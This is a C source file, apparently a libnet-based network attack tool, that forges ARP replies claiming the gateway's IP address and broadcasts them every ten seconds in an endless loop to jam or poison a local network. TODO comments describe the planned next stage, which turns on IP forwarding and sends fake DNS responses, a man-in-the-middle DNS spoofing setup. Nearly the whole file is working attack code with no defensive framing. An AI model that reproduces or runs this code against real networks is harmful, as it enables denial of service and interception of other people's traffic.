#include <libnet.h>
#include <stdlib.h>

#define ANSI_COLOR_RED "\x1b[31m"
#define ANSI_COLOR_GREEN "\x1b[32m"
#define ANSI_COLOR_RESET "\x1b[0m"

void check_prerequisites(int argc, char **argv)
{
  const int is_user_root = getuid() == 0;
  if (!is_user_root)
  {
    fprintf(stderr, ANSI_COLOR_RED "You must be root to run this program." ANSI_COLOR_RESET "\n");
    exit(EXIT_FAILURE);
  }

  const int are_all_args_provided = argc == 3;
  if (!are_all_args_provided)
  {
    fprintf(stderr, ANSI_COLOR_RED "Missing Arguments.\n" ANSI_COLOR_RESET "Usage: %s INTERFACE_NAME GATEWAY_IP_ADDR\nExample: %s wlo1 192.168.0.1\n", argv[0], argv[0]);
    exit(EXIT_FAILURE);
  }
}

#define JAM_ALL 1

void jam_network(char **argv)
{
  libnet_t *ln;
  u_int32_t target_ip_addr, zero_ip_addr;
  u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
#ifdef JAM_ALL
           zero_hw_addr[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
#else
           zero_hw_addr[6] = {0x2c, 0xf0, 0x5d, 0xae, 0xe4, 0x01};
#endif

  struct libnet_ether_addr *src_hw_addr;
  char errbuf[LIBNET_ERRBUF_SIZE];

  ln = libnet_init(LIBNET_LINK, argv[1], errbuf);
  src_hw_addr = libnet_get_hwaddr(ln);
  target_ip_addr = libnet_name2addr4(ln, argv[2], LIBNET_RESOLVE);
  zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  libnet_autobuild_arp(
      ARPOP_REPLY,                   /* operation type       */
      src_hw_addr->ether_addr_octet, /* sender hardware addr */
      (u_int8_t *)&target_ip_addr,   /* gateway ip addr      */
      zero_hw_addr,                  /* victim hardware addr */
      (u_int8_t *)&zero_ip_addr,     /* victim protocol addr */
      ln);                           /* libnet context       */
  libnet_autobuild_ethernet(
      bcast_hw_addr, /* ethernet destination */
      ETHERTYPE_ARP, /* ethertype            */
      ln);           /* libnet context       */

  printf(ANSI_COLOR_GREEN "Sending ARP packets..." ANSI_COLOR_RESET "\n");
  while (1)
  {
    libnet_write(ln);
    sleep(10);
  }
  libnet_destroy(ln);
}

int main(int argc, char **argv)
{
  check_prerequisites(argc, argv);

  // TODO Maybe start it as a thread?
  jam_network(argv);

  // TODO Add rule to iptables to forward non-DNS packets to gateway
  // TODO Write "1" to /proc/sys/net/ipv4/ip_forward
  // TODO Receive DNS packets and respond with fake DNS responses

  return EXIT_SUCCESS;
}
